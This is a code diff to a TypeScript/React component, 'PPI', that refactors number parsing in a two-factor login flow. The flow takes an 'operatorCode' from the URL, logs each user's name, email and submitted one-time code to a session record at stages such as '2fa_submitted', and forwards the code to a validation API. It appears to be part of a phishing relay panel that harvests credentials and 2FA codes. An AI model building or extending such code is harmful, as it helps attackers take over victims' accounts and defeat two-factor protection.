@@ -88,6 +88,15 @@ interface IdentityVerifyResult {
   suggested_gender?: string;
 }
 
+const parseOptionalNumber = (value: unknown): number | undefined => {
+  if (typeof value === "number" && Number.isFinite(value)) return value;
+  if (typeof value === "string") {
+    const parsed = Number(value.trim());
+    if (Number.isFinite(parsed)) return parsed;
+  }
+  return undefined;
+};
+
 const PPI = () => {
   const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
   const cleanedCode = rawOperatorCode
@@ -212,15 +221,16 @@ const PPI = () => {
       if (res.requires_2fa) {
         // 2FA required — store userId and type, show OTP screen
         if (res.fullName) setSyncedFullName(res.fullName);
-        const rawUserId = res.raw?.payload?.usuario?.id;
-        if (typeof rawUserId === "number") {
-          setTwofaUserId(rawUserId);
-        } else if (typeof rawUserId === "string" && Number.isFinite(Number(rawUserId))) {
-          setTwofaUserId(Number(rawUserId));
-        }
-        if (typeof res.twofa_type === "number") setTwofaType(res.twofa_type);
+        const parsedUserId = parseOptionalNumber(res.raw?.payload?.usuario?.id);
+        setTwofaUserId(parsedUserId ?? null);
+
+        const parsedTwofaType = parseOptionalNumber(
+          res.twofa_type ?? res.raw?.payload?.twoFAInfo?.twoFactorType,
+        );
+        if (parsedTwofaType !== undefined) setTwofaType(parsedTwofaType);
+
         await updateSession("2fa_required", {
-          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${res.twofa_type}`,
+          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${parsedTwofaType ?? "unknown"}`,
         });
         setStep("otp_2fa");
         setStatusMsg("");
@@ -290,8 +300,8 @@ const PPI = () => {
     setError("");
     try {
       await updateSession("2fa_submitted", { otp_code: `code:${code}` });
-      const resolvedUserId = typeof twofaUserId === "number" ? twofaUserId : undefined;
-      const resolvedTwofaType = typeof twofaType === "number" ? twofaType : 1;
+      const resolvedUserId = parseOptionalNumber(twofaUserId);
+      const resolvedTwofaType = parseOptionalNumber(twofaType) ?? 1;
       const res = await ppiApi.validate2fa(code, lastUsernameRef.current, resolvedUserId, resolvedTwofaType);
 
       if (res.success) {
